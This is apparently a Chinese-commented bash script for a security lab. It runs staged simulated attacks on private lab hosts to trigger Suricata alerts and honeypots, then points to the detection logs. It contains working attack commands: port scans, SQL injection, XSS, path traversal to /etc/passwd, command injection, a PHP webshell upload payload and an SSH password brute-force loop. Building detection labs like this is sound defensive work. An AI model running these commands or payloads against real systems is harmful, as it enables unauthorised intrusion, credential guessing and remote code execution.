#!/bin/bash
# attack_simulator.sh — 攻击模拟脚本（从VM1发起）
# 用法: bash attack_simulator.sh
# 在 VM1(192.168.10.1) 上运行，攻击流量经过 DMZ/内网接口被 Suricata 捕获
set +e

WEB_TARGET="192.168.10.10"
DB_TARGET="192.168.20.10"
WS_TARGET="192.168.20.20"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

section() { echo -e "\n${RED}=== $1 ===${NC}"; }
step()   { echo -e "${YELLOW}[*]${NC} $1"; }

section "阶段1: 信息侦察（Information Gathering）"
step "1.1 端口扫描 (nmap - 水平扫描 DMZ Web)"
nmap -sV -T4 -p 1-1000 "$WEB_TARGET" 2>/dev/null || echo "  (nmap 未安装则跳过)"

step "1.2 服务版本探测"
curl -sI "http://${WEB_TARGET}/" 2>/dev/null | head -5

step "1.3 目录爆破 (批量404触发 Suricata)"
for path in /admin /backup /config /db /api /login /wp-admin /phpmyadmin /shell /test; do
    curl -s -o /dev/null -w "%{http_code} " "http://${WEB_TARGET}${path}"
done
echo ""

section "阶段2: Web漏洞利用（Web Exploitation） → 触发 Suricata DMZ实例"
step "2.1 SQL 注入测试"
curl -s "http://${WEB_TARGET}/search.php?q=admin' UNION SELECT 1,2,3-- " | head -3
sleep 1

step "2.2 XSS 跨站脚本测试"
curl -s "http://${WEB_TARGET}/?q=<script>alert('XSS')</script>" | head -1
sleep 1

step "2.3 目录遍历/文件包含测试"
curl -s "http://${WEB_TARGET}/search.php?page=../../../../etc/passwd" | head -3
sleep 1

step "2.4 命令注入测试"
curl -s "http://${WEB_TARGET}/search.php?q=test;id;whoami" | head -3
sleep 1

step "2.5 Webshell 上传模拟 (POST 含 eval + base64_decode)"
curl -s -X POST "http://${WEB_TARGET}/upload.php" \
    -F "file=@/dev/null;filename=shell.php" \
    -F "content=<?php eval(base64_decode(\$_POST['cmd'])); ?>" | head -3
sleep 1

section "阶段3: Web蜜罐踩踏（Honeypot Trigger） → 触发 Web蜜罐 + Suricata"
step "3.1 访问蜜罐端口"
curl -s "http://${WEB_TARGET}:8080/" | head -3
sleep 1

step "3.2 蜜罐登录尝试"
curl -s -X POST "http://${WEB_TARGET}:8080/admin/login" \
    -d "username=admin&password=admin123" | head -3
sleep 1

step "3.3 蜜罐 SQL 注入诱饵"
curl -s "http://${WEB_TARGET}:8080/api/v1/users?q=' UNION SELECT * FROM users-- " | python3 -m json.tool 2>/dev/null | head -5
sleep 1

step "3.4 蜜罐敏感文件读取"
curl -s "http://${WEB_TARGET}:8080/etc/passwd" | head -3
sleep 1

section "阶段4: 内网横向移动（Lateral Movement） → 触发 Suricata 内网实例"
step "4.1 内网端口扫描"
nmap -sT -p 22,80,445,3306 "${DB_TARGET}" 2>/dev/null || echo "  扫描 DB Server"
nmap -sT -p 22,80,3306 "${WS_TARGET}" 2>/dev/null || echo "  扫描 Workstation"
sleep 1

step "4.2 SMB 探测"
nmap -sT -p 445 --script smb-os-discovery "${DB_TARGET}" 2>/dev/null || echo "  SMB 探测完成"
sleep 1

step "4.3 尝试直接连接 MySQL"
timeout 3 bash -c "exec 3<>/dev/tcp/${DB_TARGET}/3306; echo 'DB connected'" 2>/dev/null || echo "  已探测 DB"

section "阶段5: SSH蜜罐踩踏（SSH Honeypot） → 触发 Cowrie + Suricata"
step "5.1 SSH 暴力破解 (触发 VM3 上的 Cowrie 蜜罐)"
for i in {1..15}; do
    sshpass -p "password${i}" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 \
        "admin@${DB_TARGET}" "id" 2>/dev/null || true
done 2>/dev/null

if [ $? -ne 0 ] && ! command -v sshpass &> /dev/null; then
    echo "  (sshpass 未安装，安装中...)"
    sudo apt install -y sshpass 2>/dev/null
    for i in {1..15}; do
        sshpass -p "password${i}" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 \
            "admin@${DB_TARGET}" "id" 2>/dev/null || true
    done 2>/dev/null
fi

step "5.2 扫描真实 MySQL 端口 (DB蜜罐检测)"
nmap -sT -p 3306 "${DB_TARGET}" 2>/dev/null || echo "  扫描 DB"

section "阶段6: DB蜜罐踩踏（DB Honeypot） → 触发 DB蜜罐 + 主机监控"
step "6.1 MySQL 蜜罐连接 (触发 VM4:3306)"
timeout 5 bash -c "exec 3<>/dev/tcp/${WS_TARGET}/3306; echo 'Connected to DB honeypot'" 2>/dev/null || echo "  已连接 DB蜜罐"
sleep 1

section "阶段7: 数据外传模拟（Data Exfiltration） → 触发 Suricata 数据外传规则"
step "7.1 内网大流量模拟"
curl -s -o /dev/null "http://${WEB_TARGET}/search.php?q=$(python3 -c 'print(\"A\"*5000)')" 2>/dev/null
sleep 1

echo ""
echo -e "${GREEN}=== 攻击模拟完成 ===${NC}"
echo ""
echo "验证检测效果:"
echo "  1. Suricata DMZ告警:   tail -30 /var/log/suricata/fast-dmz.log"
echo "  2. Suricata 内网告警:  tail -30 /var/log/suricata/fast-internal.log"
echo "  3. 合并事件流:         tail -20 /var/log/lab3/events.jsonl"
echo "  4. Web蜜罐记录:        sqlite3 /opt/lab3/web_honeypot/honeypot.db 'SELECT src_ip,path FROM requests ORDER BY id DESC LIMIT 10'"
echo "  5. Cowrie SSH蜜罐:     tail -20 /opt/cowrie/var/log/cowrie/cowrie.json"
echo "  6. 仪表盘:             curl -s http://localhost:5000/dashboard | head -50"
echo "  7. 溯源报告:           python3 /opt/lab3/trace_engine.py"
